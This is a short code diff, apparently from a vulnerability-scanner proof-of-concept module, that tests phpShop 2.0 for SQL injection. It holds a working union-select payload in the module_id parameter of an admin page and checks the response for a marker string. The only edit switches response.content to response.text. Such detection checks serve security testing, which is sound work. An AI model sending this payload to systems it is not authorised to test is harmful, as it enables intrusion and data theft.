@@ -49,7 +49,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             target_url = "/phpshop 2.0/?page=admin/function_list&module_id=11' union select 1,CONCAT(0x7162787671,0x50664e68584e4c584352,0x716a717171),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 --"
             response = requests.get(arg + target_url, timeout=10)
-            content = response.content
+            content = response.text
             match = re.search('qbxvqPfNhXNLXCRqjqqq', content)
             if match:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
